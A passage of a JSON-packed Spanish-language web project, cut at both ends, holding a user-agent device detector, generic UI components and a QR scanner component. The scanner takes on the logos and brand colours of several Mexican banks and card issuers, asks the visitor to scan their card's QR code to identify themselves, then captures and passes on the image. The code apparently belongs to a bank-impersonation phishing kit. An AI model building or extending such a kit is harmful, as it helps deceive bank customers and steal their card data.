/iPad13,1|iPad13,2/i, name: 'iPad Air (4th gen)' },\n      { pattern: /iPad8,11|iPad8,12/i, name: 'iPad Pro 12.9\" (4th gen)' },\n    ];\n\n    for (const ipadModel of ipadModels) {\n      if (ipadModel.pattern.test(userAgent)) {\n        model = ipadModel.name;\n        break;\n      }\n    }\n\n    if (model === 'Desconocido') {\n      model = 'iPad';\n    }\n\n  } else {\n    // PC/Desktop\n    type = 'PC';\n    \n    if (/Windows NT 10.0/i.test(userAgent)) {\n      os = 'Windows 10/11';\n    } else if (/Windows NT 6.3/i.test(userAgent)) {\n      os = 'Windows 8.1';\n    } else if (/Windows NT 6.2/i.test(userAgent)) {\n      os = 'Windows 8';\n    } else if (/Windows NT 6.1/i.test(userAgent)) {\n      os = 'Windows 7';\n    } else if (/Mac OS X/i.test(userAgent)) {\n      os = 'macOS';\n      const macMatch = userAgent.match(/Mac OS X (\\d+_\\d+)/);\n      if (macMatch) {\n        const macVersion = macMatch[1].replace('_', '.');\n        os = `macOS ${macVersion}`;\n      }\n    } else if (/Linux/i.test(userAgent)) {\n      os = 'Linux';\n    } else if (/CrOS/i.test(userAgent)) {\n      os = 'Chrome OS';\n    }\n\n    model = `Escritorio ${os}`;\n  }\n\n  // Detectar navegador\n  if (/Chrome/i.test(userAgent) && !/Edge/i.test(userAgent)) {\n    browser = 'Chrome';\n    const chromeMatch = userAgent.match(/Chrome\\/(\\d+)/);\n    if (chromeMatch) {\n      browser = `Chrome ${chromeMatch[1]}`;\n    }\n  } else if (/Firefox/i.test(userAgent)) {\n    browser = 'Firefox';\n    const firefoxMatch = userAgent.match(/Firefox\\/(\\d+)/);\n    if (firefoxMatch) {\n      browser = `Firefox ${firefoxMatch[1]}`;\n    }\n  } else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) {\n    browser = 'Safari';\n    const safariMatch = userAgent.match(/Version\\/(\\d+)/);\n    if (safariMatch) {\n      browser = `Safari ${safariMatch[1]}`;\n    }\n  } else if (/Edge/i.test(userAgent)) {\n    browser = 'Edge';\n    const edgeMatch = userAgent.match(/Edge\\/(\\d+)/);\n    if (edgeMatch) {\n      browser = `Edge ${edgeMatch[1]}`;\n    }\n  } else if (/Opera/i.test(userAgent)) {\n    browser = 'Opera';\n  }\n\n  return {\n    type,\n    model,\n    browser,\n    os,\n    userAgent\n  };\n}\n\nexport function getDeviceDisplayName(deviceInfo: DeviceInfo): string {\n  if (deviceInfo.type === 'Android') {\n    return ` Android - ${deviceInfo.model}`;\n  } else if (deviceInfo.type === 'iPhone') {\n    return ` iOS - ${deviceInfo.model}`;\n  } else {\n    return ` Escritorio - ${deviceInfo.model}`;\n  }\n}","size_bytes":7273},"client/src/components/ui/chart.tsx":{"content":"import * as React from \"react\"\nimport * as RechartsPrimitive from \"recharts\"\n\nimport { cn } from \"@/lib/utils\"\n\n// Format: { THEME_NAME: CSS_SELECTOR }\nconst THEMES = { light: \"\", dark: \".dark\" } as const\n\nexport type ChartConfig = {\n  [k in string]: {\n    label?: React.ReactNode\n    icon?: React.ComponentType\n  } & (\n    | { color?: string; theme?: never }\n    | { color?: never; theme: Record<keyof typeof THEMES, string> }\n  )\n}\n\ntype ChartContextProps = {\n  config: ChartConfig\n}\n\nconst ChartContext = React.createContext<ChartContextProps | null>(null)\n\nfunction useChart() {\n  const context = React.useContext(ChartContext)\n\n  if (!context) {\n    throw new Error(\"useChart must be used within a <ChartContainer />\")\n  }\n\n  return context\n}\n\nconst ChartContainer = React.forwardRef<\n  HTMLDivElement,\n  React.ComponentProps<\"div\"> & {\n    config: ChartConfig\n    children: React.ComponentProps<\n      typeof RechartsPrimitive.ResponsiveContainer\n    >[\"children\"]\n  }\n>(({ id, className, children, config, ...props }, ref) => {\n  const uniqueId = React.useId()\n  const chartId = `chart-${id || uniqueId.replace(/:/g, \"\")}`\n\n  return (\n    <ChartContext.Provider value={{ config }}>\n      <div\n        data-chart={chartId}\n        ref={ref}\n        className={cn(\n          \"flex aspect-video justify-center text-xs [&_.recharts-cartesian-axis-tick_text]:fill-muted-foreground [&_.recharts-cartesian-grid_line[stroke='#ccc']]:stroke-border/50 [&_.recharts-curve.recharts-tooltip-cursor]:stroke-border [&_.recharts-dot[stroke='#fff']]:stroke-transparent [&_.recharts-layer]:outline-none [&_.recharts-polar-grid_[stroke='#ccc']]:stroke-border [&_.recharts-radial-bar-background-sector]:fill-muted [&_.recharts-rectangle.recharts-tooltip-cursor]:fill-muted [&_.recharts-reference-line_[stroke='#ccc']]:stroke-border [&_.recharts-sector[stroke='#fff']]:stroke-transparent [&_.recharts-sector]:outline-none [&_.recharts-surface]:outline-none\",\n          className\n        )}\n        {...props}\n      >\n        <ChartStyle id={chartId} config={config} />\n        <RechartsPrimitive.ResponsiveContainer>\n          {children}\n        </RechartsPrimitive.ResponsiveContainer>\n      </div>\n    </ChartContext.Provider>\n  )\n})\nChartContainer.displayName = \"Chart\"\n\nconst ChartStyle = ({ id, config }: { id: string; config: ChartConfig }) => {\n  const colorConfig = Object.entries(config).filter(\n    ([_, config]) => config.theme || config.color\n  )\n\n  if (!colorConfig.length) {\n    return null\n  }\n\n  return (\n    <style\n      dangerouslySetInnerHTML={{\n        __html: Object.entries(THEMES)\n          .map(\n            ([theme, prefix]) => `\n${prefix} [data-chart=${id}] {\n${colorConfig\n  .map(([key, itemConfig]) => {\n    const color =\n      itemConfig.theme?.[theme as keyof typeof itemConfig.theme] ||\n      itemConfig.color\n    return color ? `  --color-${key}: ${color};` : null\n  })\n  .join(\"\\n\")}\n}\n`\n          )\n          .join(\"\\n\"),\n      }}\n    />\n  )\n}\n\nconst ChartTooltip = RechartsPrimitive.Tooltip\n\nconst ChartTooltipContent = React.forwardRef<\n  HTMLDivElement,\n  React.ComponentProps<typeof RechartsPrimitive.Tooltip> &\n    React.ComponentProps<\"div\"> & {\n      hideLabel?: boolean\n      hideIndicator?: boolean\n      indicator?: \"line\" | \"dot\" | \"dashed\"\n      nameKey?: string\n      labelKey?: string\n    }\n>(\n  (\n    {\n      active,\n      payload,\n      className,\n      indicator = \"dot\",\n      hideLabel = false,\n      hideIndicator = false,\n      label,\n      labelFormatter,\n      labelClassName,\n      formatter,\n      color,\n      nameKey,\n      labelKey,\n    },\n    ref\n  ) => {\n    const { config } = useChart()\n\n    const tooltipLabel = React.useMemo(() => {\n      if (hideLabel || !payload?.length) {\n        return null\n      }\n\n      const [item] = payload\n      const key = `${labelKey || item.dataKey || item.name || \"value\"}`\n      const itemConfig = getPayloadConfigFromPayload(config, item, key)\n      const value =\n        !labelKey && typeof label === \"string\"\n          ? config[label as keyof typeof config]?.label || label\n          : itemConfig?.label\n\n      if (labelFormatter) {\n        return (\n          <div className={cn(\"font-medium\", labelClassName)}>\n            {labelFormatter(value, payload)}\n          </div>\n        )\n      }\n\n      if (!value) {\n        return null\n      }\n\n      return <div className={cn(\"font-medium\", labelClassName)}>{value}</div>\n    }, [\n      label,\n      labelFormatter,\n      payload,\n      hideLabel,\n      labelClassName,\n      config,\n      labelKey,\n    ])\n\n    if (!active || !payload?.length) {\n      return null\n    }\n\n    const nestLabel = payload.length === 1 && indicator !== \"dot\"\n\n    return (\n      <div\n        ref={ref}\n        className={cn(\n          \"grid min-w-[8rem] items-start gap-1.5 rounded-lg border border-border/50 bg-background px-2.5 py-1.5 text-xs shadow-xl\",\n          className\n        )}\n      >\n        {!nestLabel ? tooltipLabel : null}\n        <div className=\"grid gap-1.5\">\n          {payload.map((item, index) => {\n            const key = `${nameKey || item.name || item.dataKey || \"value\"}`\n            const itemConfig = getPayloadConfigFromPayload(config, item, key)\n            const indicatorColor = color || item.payload.fill || item.color\n\n            return (\n              <div\n                key={item.dataKey}\n                className={cn(\n                  \"flex w-full flex-wrap items-stretch gap-2 [&>svg]:h-2.5 [&>svg]:w-2.5 [&>svg]:text-muted-foreground\",\n                  indicator === \"dot\" && \"items-center\"\n                )}\n              >\n                {formatter && item?.value !== undefined && item.name ? (\n                  formatter(item.value, item.name, item, index, item.payload)\n                ) : (\n                  <>\n                    {itemConfig?.icon ? (\n                      <itemConfig.icon />\n                    ) : (\n                      !hideIndicator && (\n                        <div\n                          className={cn(\n                            \"shrink-0 rounded-[2px] border-[--color-border] bg-[--color-bg]\",\n                            {\n                              \"h-2.5 w-2.5\": indicator === \"dot\",\n                              \"w-1\": indicator === \"line\",\n                              \"w-0 border-[1.5px] border-dashed bg-transparent\":\n                                indicator === \"dashed\",\n                              \"my-0.5\": nestLabel && indicator === \"dashed\",\n                            }\n                          )}\n                          style={\n                            {\n                              \"--color-bg\": indicatorColor,\n                              \"--color-border\": indicatorColor,\n                            } as React.CSSProperties\n                          }\n                        />\n                      )\n                    )}\n                    <div\n                      className={cn(\n                        \"flex flex-1 justify-between leading-none\",\n                        nestLabel ? \"items-end\" : \"items-center\"\n                      )}\n                    >\n                      <div className=\"grid gap-1.5\">\n                        {nestLabel ? tooltipLabel : null}\n                        <span className=\"text-muted-foreground\">\n                          {itemConfig?.label || item.name}\n                        </span>\n                      </div>\n                      {item.value && (\n                        <span className=\"font-mono font-medium tabular-nums text-foreground\">\n                          {item.value.toLocaleString()}\n                        </span>\n                      )}\n                    </div>\n                  </>\n                )}\n              </div>\n            )\n          })}\n        </div>\n      </div>\n    )\n  }\n)\nChartTooltipContent.displayName = \"ChartTooltip\"\n\nconst ChartLegend = RechartsPrimitive.Legend\n\nconst ChartLegendContent = React.forwardRef<\n  HTMLDivElement,\n  React.ComponentProps<\"div\"> &\n    Pick<RechartsPrimitive.LegendProps, \"payload\" | \"verticalAlign\"> & {\n      hideIcon?: boolean\n      nameKey?: string\n    }\n>(\n  (\n    { className, hideIcon = false, payload, verticalAlign = \"bottom\", nameKey },\n    ref\n  ) => {\n    const { config } = useChart()\n\n    if (!payload?.length) {\n      return null\n    }\n\n    return (\n      <div\n        ref={ref}\n        className={cn(\n          \"flex items-center justify-center gap-4\",\n          verticalAlign === \"top\" ? \"pb-3\" : \"pt-3\",\n          className\n        )}\n      >\n        {payload.map((item) => {\n          const key = `${nameKey || item.dataKey || \"value\"}`\n          const itemConfig = getPayloadConfigFromPayload(config, item, key)\n\n          return (\n            <div\n              key={item.value}\n              className={cn(\n                \"flex items-center gap-1.5 [&>svg]:h-3 [&>svg]:w-3 [&>svg]:text-muted-foreground\"\n              )}\n            >\n              {itemConfig?.icon && !hideIcon ? (\n                <itemConfig.icon />\n              ) : (\n                <div\n                  className=\"h-2 w-2 shrink-0 rounded-[2px]\"\n                  style={{\n                    backgroundColor: item.color,\n                  }}\n                />\n              )}\n              {itemConfig?.label}\n            </div>\n          )\n        })}\n      </div>\n    )\n  }\n)\nChartLegendContent.displayName = \"ChartLegend\"\n\n// Helper to extract item config from a payload.\nfunction getPayloadConfigFromPayload(\n  config: ChartConfig,\n  payload: unknown,\n  key: string\n) {\n  if (typeof payload !== \"object\" || payload === null) {\n    return undefined\n  }\n\n  const payloadPayload =\n    \"payload\" in payload &&\n    typeof payload.payload === \"object\" &&\n    payload.payload !== null\n      ? payload.payload\n      : undefined\n\n  let configLabelKey: string = key\n\n  if (\n    key in payload &&\n    typeof payload[key as keyof typeof payload] === \"string\"\n  ) {\n    configLabelKey = payload[key as keyof typeof payload] as string\n  } else if (\n    payloadPayload &&\n    key in payloadPayload &&\n    typeof payloadPayload[key as keyof typeof payloadPayload] === \"string\"\n  ) {\n    configLabelKey = payloadPayload[\n      key as keyof typeof payloadPayload\n    ] as string\n  }\n\n  return configLabelKey in config\n    ? config[configLabelKey]\n    : config[key as keyof typeof config]\n}\n\nexport {\n  ChartContainer,\n  ChartTooltip,\n  ChartTooltipContent,\n  ChartLegend,\n  ChartLegendContent,\n  ChartStyle,\n}\n","size_bytes":10466},"client/src/components/ui/drawer.tsx":{"content":"import * as React from \"react\"\nimport { Drawer as DrawerPrimitive } from \"vaul\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst Drawer = ({\n  shouldScaleBackground = true,\n  ...props\n}: React.ComponentProps<typeof DrawerPrimitive.Root>) => (\n  <DrawerPrimitive.Root\n    shouldScaleBackground={shouldScaleBackground}\n    {...props}\n  />\n)\nDrawer.displayName = \"Drawer\"\n\nconst DrawerTrigger = DrawerPrimitive.Trigger\n\nconst DrawerPortal = DrawerPrimitive.Portal\n\nconst DrawerClose = DrawerPrimitive.Close\n\nconst DrawerOverlay = React.forwardRef<\n  React.ElementRef<typeof DrawerPrimitive.Overlay>,\n  React.ComponentPropsWithoutRef<typeof DrawerPrimitive.Overlay>\n>(({ className, ...props }, ref) => (\n  <DrawerPrimitive.Overlay\n    ref={ref}\n    className={cn(\"fixed inset-0 z-50 bg-black/80\", className)}\n    {...props}\n  />\n))\nDrawerOverlay.displayName = DrawerPrimitive.Overlay.displayName\n\nconst DrawerContent = React.forwardRef<\n  React.ElementRef<typeof DrawerPrimitive.Content>,\n  React.ComponentPropsWithoutRef<typeof DrawerPrimitive.Content>\n>(({ className, children, ...props }, ref) => (\n  <DrawerPortal>\n    <DrawerOverlay />\n    <DrawerPrimitive.Content\n      ref={ref}\n      className={cn(\n        \"fixed inset-x-0 bottom-0 z-50 mt-24 flex h-auto flex-col rounded-t-[10px] border bg-background\",\n        className\n      )}\n      {...props}\n    >\n      <div className=\"mx-auto mt-4 h-2 w-[100px] rounded-full bg-muted\" />\n      {children}\n    </DrawerPrimitive.Content>\n  </DrawerPortal>\n))\nDrawerContent.displayName = \"DrawerContent\"\n\nconst DrawerHeader = ({\n  className,\n  ...props\n}: React.HTMLAttributes<HTMLDivElement>) => (\n  <div\n    className={cn(\"grid gap-1.5 p-4 text-center sm:text-left\", className)}\n    {...props}\n  />\n)\nDrawerHeader.displayName = \"DrawerHeader\"\n\nconst DrawerFooter = ({\n  className,\n  ...props\n}: React.HTMLAttributes<HTMLDivElement>) => (\n  <div\n    className={cn(\"mt-auto flex flex-col gap-2 p-4\", className)}\n    {...props}\n  />\n)\nDrawerFooter.displayName = \"DrawerFooter\"\n\nconst DrawerTitle = React.forwardRef<\n  React.ElementRef<typeof DrawerPrimitive.Title>,\n  React.ComponentPropsWithoutRef<typeof DrawerPrimitive.Title>\n>(({ className, ...props }, ref) => (\n  <DrawerPrimitive.Title\n    ref={ref}\n    className={cn(\n      \"text-lg font-semibold leading-none tracking-tight\",\n      className\n    )}\n    {...props}\n  />\n))\nDrawerTitle.displayName = DrawerPrimitive.Title.displayName\n\nconst DrawerDescription = React.forwardRef<\n  React.ElementRef<typeof DrawerPrimitive.Description>,\n  React.ComponentPropsWithoutRef<typeof DrawerPrimitive.Description>\n>(({ className, ...props }, ref) => (\n  <DrawerPrimitive.Description\n    ref={ref}\n    className={cn(\"text-sm text-muted-foreground\", className)}\n    {...props}\n  />\n))\nDrawerDescription.displayName = DrawerPrimitive.Description.displayName\n\nexport {\n  Drawer,\n  DrawerPortal,\n  DrawerOverlay,\n  DrawerTrigger,\n  DrawerClose,\n  DrawerContent,\n  DrawerHeader,\n  DrawerFooter,\n  DrawerTitle,\n  DrawerDescription,\n}\n","size_bytes":3007},"client/src/components/ui/card.tsx":{"content":"import * as React from \"react\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst Card = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement>\n>(({ className, ...props }, ref) => (\n  <div\n    ref={ref}\n    className={cn(\n      \"rounded-lg border bg-card text-card-foreground shadow-sm\",\n      className\n    )}\n    {...props}\n  />\n))\nCard.displayName = \"Card\"\n\nconst CardHeader = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement>\n>(({ className, ...props }, ref) => (\n  <div\n    ref={ref}\n    className={cn(\"flex flex-col space-y-1.5 p-6\", className)}\n    {...props}\n  />\n))\nCardHeader.displayName = \"CardHeader\"\n\nconst CardTitle = React.forwardRef<\n  HTMLParagraphElement,\n  React.HTMLAttributes<HTMLHeadingElement>\n>(({ className, ...props }, ref) => (\n  <h3\n    ref={ref}\n    className={cn(\n      \"text-2xl font-semibold leading-none tracking-tight\",\n      className\n    )}\n    {...props}\n  />\n))\nCardTitle.displayName = \"CardTitle\"\n\nconst CardDescription = React.forwardRef<\n  HTMLParagraphElement,\n  React.HTMLAttributes<HTMLParagraphElement>\n>(({ className, ...props }, ref) => (\n  <p\n    ref={ref}\n    className={cn(\"text-sm text-muted-foreground\", className)}\n    {...props}\n  />\n))\nCardDescription.displayName = \"CardDescription\"\n\nconst CardContent = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement>\n>(({ className, ...props }, ref) => (\n  <div ref={ref} className={cn(\"p-6 pt-0\", className)} {...props} />\n))\nCardContent.displayName = \"CardContent\"\n\nconst CardFooter = React.forwardRef<\n  HTMLDivElement,\n  React.HTMLAttributes<HTMLDivElement>\n>(({ className, ...props }, ref) => (\n  <div\n    ref={ref}\n    className={cn(\"flex items-center p-6 pt-0\", className)}\n    {...props}\n  />\n))\nCardFooter.displayName = \"CardFooter\"\n\nexport { Card, CardHeader, CardFooter, CardTitle, CardDescription, CardContent }\n","size_bytes":1877},"client/src/utils/helpers.ts":{"content":"/**\n * Format a date to a Spanish locale string\n * @param date Date to format\n * @returns Formatted date string\n */\nexport function formatDate(date: Date): string {\n  return date.toLocaleDateString('es-ES', {\n    year: 'numeric',\n    month: 'long',\n    day: 'numeric'\n  });\n}\n\n/**\n * Generates a random string ID\n * @param length Length of the ID\n * @returns Random ID string\n */\nexport function generateRandomId(length: number = 10): string {\n  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';\n  let result = '';\n  for (let i = 0; i < length; i++) {\n    result += chars.charAt(Math.floor(Math.random() * chars.length));\n  }\n  return result;\n}\n","size_bytes":675},"client/src/components/client/QRScanner.tsx":{"content":"import React, { useState, useEffect, useRef } from 'react';\nimport { Button } from '@/components/ui/button';\nimport { Html5Qrcode } from 'html5-qrcode';\nimport { toPng } from 'html-to-image';\nimport { BankType } from '@shared/schema';\n\n// Importamos los logos de los bancos\nimport plataCardLogo from '@assets/Plata_Card_Logo.png';\nimport banorteLogo from '@assets/Banorte-01.png';\nimport liverpoolLogo from '@assets/logo-brand-liverpool-f-c-design-acaab2087aa7319e33227c007e2d759b.png';\nimport hsbcLogo from '@assets/Hsbc.png';\nimport banregioLogo from '@assets/Banregio.png.png';\nimport invexLogo from '@assets/Invex.png';\nimport bancoppelLogo from '@assets/bancoppel.png';\nimport scotiaLogo from '@assets/Skotia.png';\nimport amexLogo from '@assets/Amex.png';\n\ninterface QRScannerProps {\n  onScanSuccess: (qrData: string, qrImageData?: string) => void;\n  onCancel: () => void;\n  bankType: BankType; // A帽adimos el tipo de banco\n}\n\nconst QRScanner: React.FC<QRScannerProps> = ({ onScanSuccess, onCancel, bankType }) => {\n  const [scanning, setScanning] = useState<boolean>(false);\n  const [permissionDenied, setPermissionDenied] = useState<boolean>(false);\n  const [error, setError] = useState<string | null>(null);\n  const [capturedQR, setCapturedQR] = useState<string | null>(null);\n  const scannerRef = useRef<Html5Qrcode | null>(null);\n  const qrBoxId = \"qr-reader\";\n  const captureRef = useRef<HTMLDivElement>(null);\n\n  // Obtener el logo seg煤n el tipo de banco\n  const getBankLogo = () => {\n    switch (bankType) {\n      case BankType.PLATACARD:\n        return plataCardLogo;\n      case BankType.BANORTE:\n        return banorteLogo;\n      case BankType.LIVERPOOL:\n        return liverpoolLogo;\n      case BankType.HSBC:\n        return hsbcLogo;\n      case BankType.BANREGIO:\n        return banregioLogo;\n      case BankType.INVEX:\n        return invexLogo;\n      case BankType.BANCOPPEL:\n        return bancoppelLogo;\n      case BankType.SCOTIABANK:\n        return scotiaLogo;\n      case BankType.AMEX:\n        return amexLogo;\n      default:\n        // Si no es Plata Card, no debemos mostrar el logo de Plata Card en QR Scanner\n        return \"\";\n    }\n  };\n\n  // Obtener el estilo del bot贸n seg煤n el tipo de banco\n  const getButtonStyle = () => {\n    switch (bankType) {\n      case BankType.PLATACARD:\n        return \"bg-orange-500 hover:bg-orange-600\";\n      case BankType.BANORTE:\n        return \"bg-red-600 hover:bg-red-700\";\n      case BankType.LIVERPOOL:\n        return \"bg-pink-600 hover:bg-pink-700\";\n      case BankType.HSBC:\n        return \"bg-red-600 hover:bg-red-700\";\n      case BankType.BANREGIO:\n        return \"bg-blue-600 hover:bg-blue-700\";\n      case BankType.INVEX:\n        return \"bg-purple-600 hover:bg-purple-700\";\n      case BankType.BANCOPPEL:\n        return \"bg-yellow-600 hover:bg-yellow-700\";\n      case BankType.SCOTIABANK:\n        return \"bg-red-600 hover:bg-red-700\";\n      case BankType.AMEX:\n        return \"bg-blue-600 hover:bg-blue-700\";\n      case BankType.INBURSA:\n        return \"bg-[#1B4B72] hover:bg-[#0F3A5F]\";\n      default:\n        return \"bg-orange-500 hover:bg-orange-600\";\n    }\n  };\n\n  // Obtener el estilo del encabezado seg煤n el tipo de banco\n  const getHeaderStyle = () => {\n    switch (bankType) {\n      case BankType.PLATACARD:\n        return \"bg-gray-800 text-white\";\n      case BankType.BANORTE:\n        return \"bg-red-600 text-white\";\n      case BankType.LIVERPOOL:\n        return \"bg-pink-600 text-white\";\n      case BankType.HSBC:\n        return \"bg-white text-black\";\n      case BankType.BANREGIO:\n        return \"bg-blue-600 text-white\";\n      case BankType.INVEX:\n        return \"bg-purple-600 text-white\";\n      case BankType.BANCOPPEL:\n        return \"bg-yellow-500 text-black\";\n      case BankType.SCOTIABANK:\n        return \"bg-red-600 text-white\";\n      case BankType.AMEX:\n        return \"bg-blue-600 text-white\";\n      case BankType.INBURSA:\n        return \"bg-[#1B4B72] text-white\";\n      default:\n        return \"bg-gray-800 text-white\";\n    }\n  };\n\n  // Obtener la clase de logo seg煤n el tipo de banco\n  const getLogoClass = () => {\n    switch (bankType) {\n      case BankType.HSBC:\n        return \"h-20 mb-2\";\n      case BankType.INVEX:\n        return \"h-10 mb-2\";\n      case BankType.SANTANDER:\n      case BankType.SCOTIABANK:\n        return \"h-28 mb-2\";\n      default:\n        return \"h-16 mb-2\";\n    }\n  };\n\n  // Funci贸n para capturar la imagen del QR como base64 directamente de la c谩mara\n  const captureQRImage = async (qrData: string) => {\n    try {\n      // Capturar la vista actual del esc谩ner QR\n      if (captureRef.current) {\n        // Crear un contenedor personalizado para la captura que incluya el QR y metadata\n        const captureContainer = document.createElement('div');\n        captureContainer.className = \"qr-capture-container\";\n        captureContainer.style.width = '320px';\n        captureContainer.style.height = '420px';\n        captureContainer.style.backgroundColor = 'white';\n        captureContainer.style.padding = '15px';\n        captureContainer.style.borderRadius = '10px';\n        captureContainer.style.boxSizing = 'border-box';\n        captureContainer.style.display = 'flex';\n        captureContainer.style.flexDirection = 'column';\n        captureContainer.style.alignItems = 'center';\n        \n        // A帽adir logo y t铆tulo seg煤n el tipo de banco\n        const titleContainer = document.createElement('div');\n        titleContainer.style.marginBottom = '15px';\n        titleContainer.style.textAlign = 'center';\n        titleContainer.style.display = 'flex';\n        titleContainer.style.flexDirection = 'column';\n        titleContainer.style.alignItems = 'center';\n        \n        // Agregar logo del banco solo si es Plata Card\n        if (bankType === BankType.PLATACARD) {\n          const logoSrc = getBankLogo();\n          if (logoSrc) {\n            const logo = document.createElement('img');\n            logo.src = logoSrc;\n            logo.style.width = '120px';\n            logo.style.marginBottom = '10px';\n            titleContainer.appendChild(logo);\n          }\n        }\n        \n        const date = document.createElement('div');\n        date.textContent = new Date().toLocaleString();\n        date.style.fontSize = '12px';\n        date.style.color = '#666';\n        date.style.marginTop = '5px';\n        \n        titleContainer.appendChild(date);\n        \n        // Clonar el elemento del esc谩ner para la captura\n        const qrViewClone = captureRef.current.cloneNode(true) as HTMLElement;\n        qrViewClone.style.width = '280px';\n        qrViewClone.style.height = '280px';\n        qrViewClone.style.border = '1px solid #ccc';\n        qrViewClone.style.borderRadius = '5px';\n        qrViewClone.style.overflow = 'hidden';\n        \n        // A帽adir secci贸n para el texto del QR\n        const qrDataContainer = document.createElement('div');\n        qrDataContainer.style.marginTop = '15px';\n        qrDataContainer.style.width = '100%';\n        qrDataContainer.style.padding = '10px';\n        qrDataContainer.style.backgroundColor = '#f0f0f0';\n        qrDataContainer.style.borderRadius = '5px';\n        qrDataContainer.style.fontSize = '12px';\n        qrDataContainer.style.wordBreak = 'break-all';\n        qrDataContainer.style.maxHeight = '60px';\n        qrDataContainer.style.overflow = 'hidden';\n        qrDataContainer.textContent = qrData;\n        \n        // Construir la estructura completa\n        captureContainer.appendChild(titleContainer);\n        captureContainer.appendChild(qrViewClone);\n        captureContainer.appendChild(qrDataContainer);\n        \n        // A帽adir al DOM temporalmente\n        document.body.appendChild(captureContainer);\n        \n        // Tomar la captura\n        const dataUrl = await toPng(captureContainer);\n        \n        // Eliminar del DOM\n        document.body.removeChild(captureContainer);\n        \n        return dataUrl;\n      }\n      \n      // Si no se pudo acceder al elemento de la c谩mara, capturar solo los datos\n      return null;\n    } catch (error) {\n      console.error('Error al capturar la imagen del QR:', error);\n      return null;\n    }\n  };\n\n  // Iniciar el esc谩ner\n  const startScanner = async () => {\n    try {\n      setScanning(true);\n      setError(null);\n      setCapturedQR(null);\n\n      // Comprobamos primero si tenemos permisos de c谩mara\n      const stream = await navigator.mediaDevices.getUserMedia({ video: true });\n      // Cerramos el stream inmediatamente, solo necesit谩bamos verificar los permisos\n      stream.getTracks().forEach(track => track.stop());\n\n      // Inicializar el esc谩ner HTML5\n      if (!scannerRef.current) {\n        scannerRef.current = new Html5Qrcode(qrBoxId);\n      }\n\n      const qrCodeSuccessCallback = async (decodedText: string) => {\n        // Detener el esc谩ner despu茅s de un escaneo exitoso\n        stopScanner();\n        setCapturedQR(decodedText);\n        \n        // Capturar la imagen del QR\n        const qrImageData = await captureQRImage(decodedText);\n        \n        // Enviar el texto del QR y la imagen (si est谩 disponible)\n        onScanSuccess(decodedText, qrImageData || undefined);\n      };\n\n      const config = { \n        fps: 10, \n        qrbox: { width: 250, height: 250 },\n        formatsToSupport: ['QR_CODE']\n      };\n\n      // Iniciar el esc谩ner con la c谩mara trasera preferiblemente\n      await scannerRef.current.start(\n        { facingMode: \"environment\" }, \n        config, \n        qrCodeSuccessCallback, \n        undefined\n      );\n    } catch (err: any) {\n      console.error(\"Error al iniciar el esc谩ner:\", err);\n      \n      // Verificar si el error es por negaci贸n de permisos\n      if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {\n        setPermissionDenied(true);\n        setError(\"No se otorgaron permisos para acceder a la c谩mara\");\n      } else {\n        setError(`Error: ${err.message || \"No se pudo iniciar el esc谩ner QR\"}`);\n      }\n      \n      setScanning(false);\n    }\n  };\n\n  // Detener el esc谩ner\n  const stopScanner = async () => {\n    if (scannerRef.current && scanning) {\n      try {\n        await scannerRef.current.stop();\n      } catch (error) {\n        console.error(\"Error al detener el esc谩ner:\", error);\n      }\n    }\n    setScanning(false);\n  };\n\n  // Limpiar al desmontar el componente\n  useEffect(() => {\n    return () => {\n      stopScanner();\n    };\n  }, []);\n\n  const headerClasses = `flex flex-col items-center mb-4 p-4 w-full ${getHeaderStyle()}`;\n  const buttonClass = getButtonStyle();\n  const logoClass = getLogoClass();\n\n  return (\n    <div className=\"flex flex-col items-center\">\n      <div className={headerClasses}>\n        {/* Solo mostrar el logo si el banco es Plata Card */}\n        {bankType === BankType.PLATACARD && (\n          <img src={plataCardLogo} alt=\"Plata Card Logo\" className={logoClass} />\n        )}\n        <h2 className=\"text-xl font-bold\">Escanea el QR de tu tarjeta para identificarte</h2>\n        <p className={bankType === BankType.HSBC ? \"text-gray-600\" : \"text-gray-200\"}>\n          Posiciona el c贸digo QR dentro del recuadro para escanearlo\n        </p>\n      </div>\n\n      {error && (\n        <div className=\"bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4\">\n          {error}\n          {permissionDenied && (\n            <p className=\"mt-2 text-sm\">\n              Para usar esta funci贸n, debes permitir el acceso a la c谩mara en la configuraci贸n de tu navegador.\n            </p>\n          )}\n        </div>\n      )}\n\n      <div className=\"relative mb-4 border-2 border-dashed border-gray-300 rounded-lg p-1\">\n        <div \n          id={qrBoxId} \n          className=\"w-80 h-80 bg-gray-100 rounded\" \n          ref={captureRef}\n          style={{ \n            filter: 'brightness(1.2) contrast(1.2)',  // Mejora la visibilidad del esc谩ner\n          }}\n        ></div>\n        {!scanning && (\n          <div className=\"absolute inset-0 flex items-center justify-center bg-black bg-opacity-30 rounded-lg\">\n            <p className=\"text-white font-bold\">C谩mara desactivada</p>\n          </div>\n        )}\n      </div>\n\n      {capturedQR && (\n        <div className=\"mb-4 p-3 bg-green-100 border border-green-400 text-green-700 rounded\">\n          <p className=\"font-bold\">QR escaneado correctamente</p>\n          <p className=\"text-sm truncate w-80\">{capturedQR}</p>\n        </div>\n      )}\n\n      <div className=\"flex space-x-4\">\n        {!scanning ? (\n          <Button \n            className={buttonClass}\n            onClick={startScanner}\n          >\n            Iniciar c谩mara\n          </Button>\n        ) : (\n          <Button \n            className=\"bg-red-500 hover:bg-red-600\"\n            onClick={stopScanner}\n          >\n            Detener c谩mara\n          </Button>\n        )}\n        <Button \n          variant=\"outline\" \n          onClick={onCancel}\n        >\n          Cancelar\n        </Button>\n      </div>\n    </div>\n  );\n};\n\nexport default QRScanner;","size_bytes":13021},"client/src/utils/websocket.ts":{"content":"/**\n * Creates a WebSocket connection to the server with the proper protocol\n * @param path The WebSocket endpoint path\n * @returns A new WebSocket instance\n */\nexport function createSocketConnection(path: string): WebSocket {\n  const protocol = window.location.protocol === \"https:\" ? \"wss:\" : \"ws:\";\n  const wsUrl = `${protocol}//${window.location.host}${path}`;\n  return new 